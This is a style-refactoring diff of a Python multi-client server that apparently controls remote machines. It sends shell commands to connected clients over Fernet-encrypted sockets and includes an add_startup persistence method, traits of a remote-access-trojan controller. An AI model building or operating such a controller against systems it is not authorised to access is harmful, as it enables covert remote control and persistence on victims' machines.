@@ -1,3 +1,4 @@
+""" Imports """
 import json
 import logging
 import os
@@ -58,19 +59,21 @@ def read_file(path: str, block_size: int = 32768) -> bytes:
                 return
 
 
-def errors(ERROR: Exception, line: bool = True) -> str:
+def errors(error: Exception, line: bool = True) -> str:
     """ Error Handler """
-    error_class = ERROR.__class__.__name__
+    error_class = error.__class__.__name__
     error_msg = f'{error_class}:'
     try:
-        error_msg += f' {ERROR.args[0]}'
-    except Exception: pass
+        error_msg += f' {error.args[0]}'
+    except Exception:
+        pass
     if line:
         try:
-            _, _, tb = sys.exc_info()
-            line_number = traceback.extract_tb(tb)[-1][1]
+            _, _, traceb = sys.exc_info()
+            line_number = traceback.extract_tb(traceb)[-1][1]
             error_msg += f' (line {line_number})'
-        except Exception: pass
+        except Exception:
+            pass
     return error_msg
 
 
@@ -84,25 +87,25 @@ def shell_print(data: bytes) -> None:
             print(data.decode('cp437'))
         except UnicodeDecodeError:
             print(data.decode(errors='replace'))
-    return
 
 
 _time = lambda: f"{datetime.now()}".replace(':', '-')
 
 
 class Client(object):
+    """ Client Connection Object """
 
     def __init__(self, conn: socket.socket, address: list, fernet: Fernet) -> None:
         self.conn = conn
         self.address = address
         self.fernet = fernet
 
-    def recvall(self, n: int) -> bytes:
+    def recvall(self, byteamount: int) -> bytes:
         """ Function to receive n amount of bytes"""
         # returns bytes/None
         data = b''
-        while len(data) < n:
-            data += self.conn.recv(n - len(data))
+        while len(data) < byteamount:
+            data += self.conn.recv(byteamount - len(data))
         return data
 
     def receive(self) -> bytes:
@@ -183,7 +186,6 @@ class Client(object):
         # returns None
         self.send_json(['RESTART_SESSION'])
         self.receive()
-        return
 
     def disconnect(self) -> None:
         """ Disconnect Client """
@@ -191,7 +193,6 @@ class Client(object):
         self.send_json(['DISCONNECT'])
         self.receive()
         self.conn.close()
-        return
 
     def add_startup(self) -> Tuple[bool, str]:
         """ Add Client to Startup """
@@ -388,6 +389,7 @@ class Client(object):
 
 
 class MultiServer(object):
+    """ Multi-connection Server class """
 
     def __init__(self, port: int, key: bytes) -> None:
         self.host = ''
@@ -401,9 +403,9 @@ class MultiServer(object):
         try:
             self.socket = socket.socket()
         except socket.error as msg:
-            logging.error(errors(msg))
-            # TODO: Added exit
-            sys.exit(1)
+            error = errors(msg)
+            logging.error(error)
+            sys.exit(error)
         self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         return
 
@@ -413,8 +415,8 @@ class MultiServer(object):
         try:
             self.socket.bind((self.host, self.port))
             self.socket.listen(5)
-        except socket.error as e:
-            logging.error(f"Socket binding error: {e}")
+        except socket.error as error:
+            logging.error("Socket binding error: %s", error)
             time.sleep(5)
             self.socket_bind()
         return
@@ -435,14 +437,16 @@ class MultiServer(object):
                     msg = f'Connection has been established: {address[0]} ({address[-1]})'
                     bar = len(msg)*'-'
                     print(f'\n{bar}\n{msg}\n{bar}')
-            except Exception as e:
-                logging.debug(errors(e))
+            except Exception as error:
+                logging.debug(errors(error))
 
     def del_client(self, client: Client) -> None:
+        """ Disconnect client and remove from connection list """
         try:
             self.clients.remove(client)
             client.conn.close()
-        except Exception: pass
+        except Exception:
+            pass
         return
 
     def refresh_connections(self) -> None:
@@ -452,7 +456,7 @@ class MultiServer(object):
             try:
                 client.send_json(['LIST'])
                 client.conn.recv(20480)
-            except:
+            except Exception:
                 self.del_client(client)
 
     def list_connections(self) -> None:
@@ -485,7 +489,7 @@ class MultiServer(object):
             if command in ['exit', 'exit()']:
                 break
             output, error = client.exec(command)
-            if error != None:
+            if error is not None:
                 print(error)
                 continue
             if output != '':
@@ -684,8 +688,8 @@ class MultiServer(object):
             try:
                 print(f'Response from {client.address[0]}:')
                 self.selector(client, command)
-            except Exception as e:
-                print(errors(e))
+            except Exception as error:
+                print(errors(error))
 
     def interface(self, client: Client) -> None:
         """ CLI to Client """
@@ -716,8 +720,8 @@ class MultiServer(object):
                             self.interface(client)
                         except (EOFError, KeyboardInterrupt):
                             print()
-                        except Exception as e:
-                            print(f'Connection lost: {errors(e)}')
+                        except Exception as error:
+                            print(f'Connection lost: {errors(error)}')
                             self.del_client(client)
                             self.refresh_connections()
                     else:
@@ -730,8 +734,8 @@ class MultiServer(object):
                 print('\nShutting down Server...')
                 time.sleep(2)
                 break
-            except Exception as e:
-                print(errors(e))
+            except Exception as error:
+                print(errors(error))
 
 
 def accept_conns(server: MultiServer) -> None:
